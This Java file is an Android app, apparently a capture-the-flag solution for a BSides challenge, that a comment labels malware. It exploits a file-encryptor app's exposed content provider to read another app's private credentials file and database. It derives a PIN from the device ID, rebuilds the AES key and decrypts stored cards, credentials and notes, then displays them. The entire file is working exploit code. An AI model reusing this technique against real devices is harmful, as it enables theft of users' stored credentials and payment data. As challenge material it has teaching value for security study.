package hu.vsza.bsides.malware;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.util.Base64;
import android.net.Uri;
import android.telephony.TelephonyManager;
import android.widget.TextView;
import android.database.sqlite.*;
import android.database.Cursor;
import java.io.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.security.Key;

public class Main extends Activity
{
    public final static String TAG = "VSzAMalware";
    public final static byte[] SALT = new byte[16];
    protected Key key;
    protected String[] TABLES = {"cards", "creds", "notes", "public"};
    public final static String DB = "copy.db";

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        try {
            InputStream istr = openFile(
                        "/data/data/com.example.bsidechallenge/files/creds.txt");
            Log.i(TAG, "Available: " + istr.available());
            InputStreamReader isr = new InputStreamReader(istr);
            BufferedReader br = new BufferedReader(isr);
            String creds = br.readLine();
            br.close();
            isr.close();
            istr.close();
            Log.i(TAG, "Contents: " + creds);

            TelephonyManager tm = (TelephonyManager)getSystemService("phone");
            String did = tm.getDeviceId();
            Log.i(TAG, "DeviceId: " + did);

            byte[] result = xor(did.getBytes(), Base64.decode(creds, Base64.DEFAULT));
            String pin = new String(result).substring(0, 4);

            Log.i(TAG, "PIN: " + pin);
            TextView tv = (TextView)findViewById(R.id.pin);
            tv.setText(pin);

            genKey(pin);

            istr = openFile(
                        "/data/data/com.example.bsidechallenge/databases/evilPlannerdb");
            int count;
            byte[] buffer = new byte[8192];
            File dbFile = getDatabasePath(DB);
            dbFile.getParentFile().mkdirs();
            FileOutputStream out = new FileOutputStream(dbFile);
            while ((count = istr.read(buffer)) > 0)
                out.write(buffer, 0, count);
            out.close();
            istr.close();

            StringBuilder sb = new StringBuilder();
            SQLiteDatabase db = openOrCreateDatabase(DB, MODE_PRIVATE, null);
            for (String table : TABLES) {
                sb.append("[").append(table).append("]");
                Cursor cur = db.rawQuery("SELECT * FROM " + table, new String[] {});
                while (cur.moveToNext()) {
                    sb.append("\n");
                    for (int i = 0; i < cur.getColumnCount(); i++) {
                        String content = cur.getString(i);
                        String name = cur.getColumnName(i);
                        if (!name.equals("id")) content = decryptMessage(content);
                        sb.append("\n").append(name)
                            .append(": ").append(content);
                    }
                }
                sb.append("\n\n");
                cur.close();
            }
            db.close();
            tv = (TextView)findViewById(R.id.dump);
            tv.setText(sb);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected InputStream openFile(String path) throws Exception {
        return getContentResolver().openInputStream(Uri.parse(
                        "content://com.mwri.fileEncryptor.localfile" + path));
    }

    protected void genKey(String pin) throws Exception {
        SecretKeyFactory skf = SecretKeyFactory.getInstance("PBEWITHSHA256AND256BITAES-CBC-BC");
        PBEKeySpec pks = new PBEKeySpec(pin.toCharArray(), SALT, 1024, 256);
        byte[] secret = skf.generateSecret(pks).getEncoded();
        key = new SecretKeySpec(secret, "AES");
    }

    // Copy-pasted from JD-GUI output
    private static byte[] xor(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)
    {
        byte[] arrayOfByte = new byte[paramArrayOfByte1.length];
        int i = 0;
        while (true)
        {
            int j = paramArrayOfByte1.length;
            if (i >= j)
                return arrayOfByte;
            int k = paramArrayOfByte1[i];
            int m = paramArrayOfByte2.length;
            int n = i % m;
            int i1 = paramArrayOfByte2[n];
            int i2 = (byte)(k ^ i1);
            arrayOfByte[i] = (byte)i2;
            i += 1;
        }
    }

    public String decryptMessage(String paramString)
    {
        try {
            byte[] encrypted = Base64.decode(paramString, 0);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(2, key);
            byte[] decrypted = cipher.doFinal(encrypted);
            return new String(decrypted);
        } catch (Exception e) {
            return paramString;
        }
    }
}
